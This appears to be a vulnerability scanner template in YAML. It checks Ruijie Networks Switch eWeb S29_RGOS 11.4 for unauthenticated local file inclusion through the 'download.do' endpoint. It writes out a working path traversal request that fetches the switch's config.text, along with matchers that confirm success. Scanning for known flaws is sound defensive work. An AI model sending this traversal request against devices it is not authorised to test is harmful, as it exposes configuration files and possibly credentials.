id: ruijie-networks-lfi
name: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
severity: high
confidence: tentative
description: Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file inclusion and allows remote unauthenticated
  attackers to access locally stored files and retrieve their content via the 'download.do' endpoint.
reference: CWE-22
tags:
- ruijie
- lfi
- edb
- vuln
requests:
- method: GET
  path: /download.do?file=../../../../config.text
  matchers:
  - type: header
    words:
    - filename="config.text"
    - 'Content-Type: application/octet-stream'
  - type: body
    words:
    - version S29_RGOS 11.4
  - type: status
    status:
    - 200
  condition: and
